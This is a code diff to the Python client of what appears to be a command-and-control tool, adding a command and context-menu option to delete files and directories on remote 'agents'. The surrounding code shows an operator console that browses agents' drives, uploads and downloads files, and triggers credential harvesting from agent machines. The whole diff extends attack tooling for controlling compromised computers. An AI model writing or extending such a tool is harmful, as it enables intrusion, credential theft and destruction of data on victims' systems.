@@ -518,6 +518,25 @@ class C2R2ApiClient:
         except Exception as e:
             return False, str(e)
     
+    def delete_file(self, agent_id: int, path: str) -> tuple[bool, str]:
+        """Delete a file or directory on agent."""
+        if not self.connected:
+            return False, "Not connected"
+        
+        try:
+            response = requests.post(
+                f"{self.base_url}/api/agents/{agent_id}/delete",
+                headers=self._headers(),
+                json={"path": path},
+                timeout=30
+            )
+            
+            data = response.json()
+            return data.get("success", False), data.get("message", "Unknown error")
+            
+        except Exception as e:
+            return False, str(e)
+    
     def change_directory(self, agent_id: int, path: str) -> tuple[bool, str]:
         """Change current directory on agent."""
         if not self.connected:
@@ -1445,6 +1464,12 @@ class C2R2TeamClient:
                 'success'
             )
         
+        elif event_type == "FileDeleted":
+            self._log_console(
+                f"🗑️ Deleted on agent {data.get('agent_id')}: {data.get('path')}\n",
+                'success'
+            )
+        
         elif event_type == "CredentialsHarvested":
             self._log_console(
                 f"🔑 Credentials harvested from agent {data.get('agent_id')}: "
@@ -1785,6 +1810,13 @@ class C2R2TeamClient:
                 else:
                     self._upload_file(self.selected_client, local_path, remote_path)
         
+        elif command == '/rm' and len(parts) >= 2:
+            if self.selected_client is None:
+                self._log_console("❌ No agent selected. Use /select <id>\n", 'error')
+            else:
+                remote_path = ' '.join(parts[1:])
+                self._delete_remote_file(self.selected_client, remote_path)
+        
         elif command == '/harvest':
             if self.selected_client is None:
                 self._log_console("❌ No agent selected. Use /select <id>\n", 'error')
@@ -1902,6 +1934,20 @@ class C2R2TeamClient:
             self.root.after(0, lambda: self._log_console(f"📤 [{agent_id}]: {message}\n", tag))
         
         threading.Thread(target=upload_thread, daemon=True).start()
+    
+    def _delete_remote_file(self, agent_id: int, remote_path: str):
+        """Delete a file or directory on agent."""
+        self.logger.info(f"Deleting on agent {agent_id}: {remote_path}")
+        def delete_thread():
+            success, message = self.api.delete_file(agent_id, remote_path)
+            tag = 'success' if success else 'error'
+            if success:
+                self.logger.info(f"Delete request sent for {remote_path}")
+            else:
+                self.logger.error(f"Delete failed: {message}")
+            self.root.after(0, lambda: self._log_console(f"🗑️ [{agent_id}]: {message}\n", tag))
+        
+        threading.Thread(target=delete_thread, daemon=True).start()
     
     def _harvest_credentials(self, agent_id: int):
         """Trigger credential harvesting."""
@@ -2030,6 +2076,7 @@ class C2R2TeamClient:
    /pwd                   - Show current working directory
    /download <path>       - Download file from agent
    /upload <local> <remote> - Upload file to agent
+   /rm <path>             - Delete file or directory on agent
 
 🔧 Advanced Operations:
    /harvest               - Harvest credentials
@@ -2315,6 +2362,9 @@ class C2R2TeamClient:
         file_context_menu.add_command(label="📤 Upload Here...",
                                      command=lambda: upload_to_current())
         file_context_menu.add_separator()
+        file_context_menu.add_command(label="🗑️ Delete",
+                                     command=lambda: delete_selected())
+        file_context_menu.add_separator()
         file_context_menu.add_command(label="🔄 Refresh", 
                                      command=lambda: load_directory(path_var.get()))
         
@@ -2453,6 +2503,41 @@ class C2R2TeamClient:
                     explorer.after(0, lambda: status_var.set(f"Error: {message}"))
             
             threading.Thread(target=ul_thread, daemon=True).start()
+        
+        def delete_selected():
+            selection = file_tree.selection()
+            if not selection:
+                return
+            
+            item = selection[0]
+            values = file_tree.item(item)['values']
+            name = values[0]
+            is_directory = (len(values) > 3 and values[3] == 'D') or '📁' in str(values[1])
+            
+            current_path = path_var.get().rstrip('\\\\//')
+            full_path = f"{current_path}\\{name}"
+            
+            item_type = "directory" if is_directory else "file"
+            confirm = messagebox.askyesno(
+                "Confirm Delete",
+                f"Are you sure you want to delete this {item_type}?\n\n{full_path}",
+                parent=explorer
+            )
+            if not confirm:
+                return
+            
+            status_var.set(f"Deleting {name}...")
+            
+            def del_thread():
+                success, message = self.api.delete_file(self.context_menu_agent_id, full_path)
+                if success:
+                    explorer.after(0, lambda: status_var.set(f"Delete request sent: {name}"))
+                    # Refresh directory listing after a short delay
+                    explorer.after(500, lambda: load_directory(path_var.get()))
+                else:
+                    explorer.after(0, lambda: status_var.set(f"Error: {message}"))
+            
+            threading.Thread(target=del_thread, daemon=True).start()
         
         # Load initial directory
         load_directory("C:\\")
